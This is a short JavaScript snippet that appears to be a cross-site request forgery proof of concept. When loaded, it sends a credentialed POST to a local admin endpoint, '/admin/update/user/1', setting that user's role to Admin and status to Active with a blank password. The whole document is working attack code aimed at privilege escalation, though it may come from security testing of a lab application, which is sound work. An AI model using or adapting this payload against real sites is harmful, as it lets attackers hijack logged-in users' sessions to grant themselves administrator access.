function submitRequest()
{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http:\/\/127.0.0.1:5000\/admin\/update\/user\/1", true);
  xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
  xhr.withCredentials = true;
  var body = "fname=Hugo&lname=Smith&username=jon&password=&trackerkey=0&role=Admin&status=Active";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
}
submitRequest();
